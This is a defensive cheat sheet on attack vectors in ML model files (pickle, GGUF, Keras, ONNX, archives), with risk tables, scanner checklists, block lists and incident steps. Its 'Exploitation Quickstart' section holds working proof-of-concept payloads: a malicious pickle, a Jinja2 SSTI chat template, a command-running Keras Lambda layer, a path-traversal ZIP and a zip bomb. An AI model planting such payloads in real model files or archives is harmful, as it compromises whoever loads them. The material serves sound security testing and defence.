# ML Attack Vectors - Quick Reference Cheat Sheet

---

## 🚨 CRITICAL THREATS (Act Now)

| Threat | File Types | Risk | Action |
|--------|-----------|------|--------|
| **Pickle RCE** | .pkl, .pt, .pth, .joblib, .skops | CRITICAL | Ban or sandbox unpickling |
| **Skops CVEs** | .skops, .pkl | CRITICAL | Upgrade to >= 0.12.0 |
| **GGUF SSTI** | .gguf | CRITICAL | Validate chat_template, disable unsafe filters |
| **Keras Lambda** | .h5, .keras | CRITICAL | Whitelist allowed layer types |
| **Archive Traversal** | .zip, .tar, .7z | HIGH | Validate paths, extract to sandbox |
| **PMML XXE** | .pmml | CRITICAL | Disable entity resolution, use defusedxml |

---

## 📋 FILE TYPE RISK ASSESSMENT

### CRITICAL RISK (Implement Security Controls Immediately)
```
.pkl  │ Pickle RCE            │ PickleScanner
.pt   │ PyTorch RCE           │ PyTorch ZIP + PickleScanner
.pth  │ PyTorch RCE           │ PyTorch ZIP + PickleScanner
.h5   │ Keras Lambda RCE      │ Keras H5 Scanner
.hdf5 │ Keras Lambda RCE      │ Keras H5 Scanner
.keras│ Keras Archive RCE     │ Keras ZIP + Archive Scanner
.skops│ Skops CVE-2025-544xx  │ Skops Scanner
.gguf │ SSTI (CVE-2024-34359) │ GGUF + Jinja2 Scanner
.pmml │ XXE Attack            │ PMML Scanner
.bst  │ XGBoost RCE           │ XGBoost Scanner
```

### HIGH RISK (Implement Controls)
```
.joblib   │ Compression bomb + Pickle │ Joblib + Archive Scanner
.tflite   │ Custom ops RCE            │ TensorFlow Lite Scanner
.pb       │ py_func RCE               │ TensorFlow SavedModel Scanner
.onnx     │ Custom operator RCE       │ ONNX Scanner
.npy      │ Object array pickle       │ NumPy Scanner
.npz      │ ZIP bomb + pickle         │ Archive + NumPy Scanner
.msgpack  │ Malicious msgpack         │ Flax/JAX Scanner
.xml      │ Path traversal (OpenVINO) │ OpenVINO Scanner
.zip      │ Directory traversal       │ ZIP Archive Scanner
.tar      │ Symlink attack            │ TAR Scanner
.7z       │ Compression bomb          │ 7-Zip Scanner
.json     │ Config injection          │ Manifest Scanner
.yaml     │ Config injection          │ Manifest Scanner
```

---

## 🔍 QUICK ATTACK LOOKUP TABLE

### By Attack Vector

#### Remote Code Execution (RCE)
| Method | Formats | Effort | Impact |
|--------|---------|--------|--------|
| Pickle deserialization | .pkl, .joblib, .pt, .skops | Minutes | Full system compromise |
| Lambda layer code | .h5, .keras | Hours | Model hijacking + RCE |
| Jinja2 SSTI | .gguf | Minutes | Full system compromise |
| XXE in PMML | .pmml | Minutes | File disclosure + RCE |
| py_func in TF | .pb | Hours | Code execution + file access |
| Custom ops | .onnx, .tflite | Days | Framework-level access |

#### Data Exfiltration
| Method | Formats | Detection | Mitigation |
|--------|---------|-----------|------------|
| Embedded URLs/IPs | All | Network scanner | Whitelist outbound IPs |
| Credentials in files | All | Credential scanner | Scan before loading |
| Callbacks/hooks | .ckpt, .gguf | Code pattern analysis | Safe deserialization |

#### Denial of Service
| Method | Formats | Detection | Mitigation |
|--------|---------|-----------|------------|
| Compression bomb | .zip, .7z | Ratio > 100x | Limit decompression size |
| TAR bomb | .tar.gz | File count | Limit extracted file count |
| Memory exhaustion | .npy, .onnx | Header analysis | Limit array dimensions |

#### Privilege Escalation
| Method | Formats | Context | Mitigation |
|--------|---------|---------|------------|
| setuid bits | .tar | File permissions | Extract to sandbox |
| Symlinks | .tar, .zip | Path resolution | Disable symlink resolution |
| API key theft | All | Credential scan | Never embed secrets |

---

## 🛡️ SCANNING CHECKLIST

### Essential Scanners (Enable All)
- [ ] **PickleScanner** - Pickle-based formats
- [ ] **ArchiveScanner** - ZIP, TAR, 7-Zip, NPZ
- [ ] **ConfigurationScanner** - JSON, YAML, manifests
- [ ] **CredentialScanner** - API keys, tokens, passwords
- [ ] **NetworkScanner** - URLs, IPs, C&C patterns
- [ ] **JinjaScanner** - Template injection (GGUF, config)

### Format-Specific Scanners
- [ ] **PickleScanner** (pkl, joblib, PyTorch ZIP, Skops)
- [ ] **TensorFlowScanner** (pb, SavedModel, Lite)
- [ ] **KerasScanner** (h5, hdf5, keras ZIP)
- [ ] **ONNXScanner** (onnx)
- [ ] **NumPyScanner** (npy, npz)
- [ ] **GGUFScanner** (gguf, ggml)
- [ ] **PMMLScanner** (pmml)
- [ ] **XGBoostScanner** (bst, model, json)
- [ ] **FlaxScanner** (msgpack, flax, orbax)

### Cross-Format Analysis
- [ ] Weight distribution analysis (neural networks)
- [ ] License compliance check
- [ ] Metadata validation
- [ ] Configuration review
- [ ] Text content analysis

---

## 🚀 EXPLOITATION QUICKSTART

### 1. Pickle RCE (5 minutes)
```python
# Create malicious pickle
import pickle
import os

class RCE:
    def __reduce__(self):
        return (os.system, ("whoami",))

with open("model.pkl", "wb") as f:
    pickle.dump(RCE(), f)

# Exploit: pickle.load(open("model.pkl", "rb"))
```

### 2. GGUF SSTI (5 minutes)
```json
{
  "general.name": "model",
  "tokenizer.chat_template": "{{ config.__class__.__bases__[0].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].system('id') }}"
}
```

### 3. Keras Lambda (10 minutes)
```python
import tensorflow as tf

model = tf.keras.Sequential([
    tf.keras.layers.Lambda(lambda x: __import__('os').system('whoami'))
])

model.save("model.keras")
```

### 4. ZIP Path Traversal (5 minutes)
```python
import zipfile

with zipfile.ZipFile("archive.zip", "w") as z:
    # File will be extracted outside intended directory
    z.writestr("../../etc/passwd", "malicious content")
```

### 5. Archive Bomb (1 minute)
```bash
# Use 42.zip or create your own:
# 1MB of data compresses to ~10KB
python -c "import zipfile; z=zipfile.ZipFile('bomb.zip','w'); z.writestr('a','A'*1000000); z.close()"
```

---

## 🔑 Default Dangerous Patterns

### Python/Module Imports to Block
```
- os (system access)
- subprocess (command execution)
- sys (system info)
- socket (network)
- urllib (network)
- requests (network)
- exec, eval (code execution)
- __import__ (dynamic imports)
- eval, compile (code generation)
```

### File Paths to Block
```
- /etc/
- /root/
- /home/
- /sys/
- /proc/
- /dev/
- ../
-  ..\\
```

### Network Patterns to Flag
```
- URLs: http://, https://, ftp://
- IPs: \d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}
- Domains: beacon.*, callback.*, exfil.*
- Ports: 4444, 5555, 8888, 9999
```

## 📊 COMPRESSION RATIO RED FLAGS

| Ratio | Risk | Example | Action |
|-------|------|---------|--------|
| 1-10x | Normal | Standard ZIP | Allow |
| 10-100x | Suspicious | Highly repetitive data | Warn |
| >100x | CRITICAL | ZipBomb pattern | Block |

---

## 🔗 Quick Risk Scoring

**Risk Score = Severity × Likelihood × Impact**

### Severity (Base)
- RCE: 10
- Data Exfiltration: 8
- DoS: 5
- Credential Exposure: 9
- Information Disclosure: 3

### Likelihood (Format-dependent)
- Pickle formats: 0.9 (exploitable with existing tools)
- Keras Lambda: 0.7 (requires custom model)
- GGUF SSTI: 0.9 (public PoC available)
- Archive traversal: 0.8 (common packaging error)

### Impact
- Production ML system: 10
- Development environment: 5
- Research project: 3

**Example:** Pickle in production = 10 × 0.9 × 10 = **90 (CRITICAL)**

---

## 📱 Mobile/Edge-Specific Threats

### ExecuTorch (.pte)
- Risk: Limited monitoring on edge devices
- Vector: Pickle + embedded binaries
- Mitigation: Validate before deployment

### TensorFlow Lite (.tflite)
- Risk: Custom operations on resource-constrained hardware
- Vector: Malicious Flex delegate
- Mitigation: Restrict to built-in ops

### ONNX on Mobile
- Risk: Custom operators run natively
- Vector: Compiled malicious code
- Mitigation: Code signing validation

---

## 🎯 Incident Response Steps

### Upon Discovering Suspicious Model File

1. **Isolate** - Prevent loading/execution
2. **Scan** - Run full Promptfoo ModelAudit
3. **Analyze** - Review detailed scanner output
4. **Investigate** - Check source, signatures, modifications
5. **Report** - Document findings, notify security team
6. **Remediate** - Replace with clean version, patch systems
7. **Monitor** - Watch for related compromises

---

## 📚 Referenced CVE Summaries

### CVE-2025-54412 (Skops RCE)
- **CVSS:** 9.8 (Critical)
- **Status:** Disclosed
- **Affected:** Skops < 0.12.0
- **Fix:** Upgrade to >= 0.12.0
- **Details:** See CVE_AND_VULNERABILITIES.md

### CVE-2024-34359 (GGUF SSTI)
- **CVSS:** 9.8 (Critical)
- **Status:** Disclosed
- **Affected:** llama-cpp-python
- **Fix:** Template validation in place
- **Details:** See CVE_AND_VULNERABILITIES.md

---

## 🔐 Security Baseline Configuration

```yaml
# Minimal security baseline
threat_detection:
  pickle_scanning: enabled
  archive_bomb_limit: 100  # compression ratio
  max_decompressed_size: 10GB
  path_traversal_check: enabled
  credential_scan: enabled
  network_pattern_check: enabled
  jinja2_unsafe_filters: disabled

model_loading:
  strict_type_check: enabled
  allowed_layers: [Dense, Conv2D, LSTM]  # whitelist approach
  disable_lambda_layers: true
  disable_custom_objects: true
  sandboxed_execution: true

distribution:
  signature_validation: required
  hash_verification: required
  source_validation: required
  scan_before_load: required
```

---

## 🎓 Learning Path

### Beginner Security Analyst
1. Read: Quick Reference Cheat Sheet (this document)
2. Study: File Type Risk Assessment
3. Enable: Essential Scanners
4. Practice: Run scan on known models

### Intermediate ML Security Engineer
1. Read: ml_attack_vectors.md
2. Study: CVE_AND_VULNERABILITIES.md
3. Implement: Phase-based scanning
4. Configure: Format-specific scanners

### Advanced Red Teamer
1. Review: All documentation
2. Study: Exploitation quickstart
3. Practice: Create test payloads
4. Test: Against security controls

---

## 📞 Support & Updates

**Last Updated:** March 11, 2026

**Check these resources for latest:**
- https://www.promptfoo.dev/
- https://nvd.nist.gov/
- https://github.com/promptfoo/promptfoo

**Related Reading:**
- See INDEX.md for full navigation
- See ml_attack_vectors.md for comprehensive reference
- See CVE_AND_VULNERABILITIES.md for latest threats

---

**Disclaimer:** This document is for authorized security research and testing only. Unauthorized access to computer systems is illegal. Use responsibly.
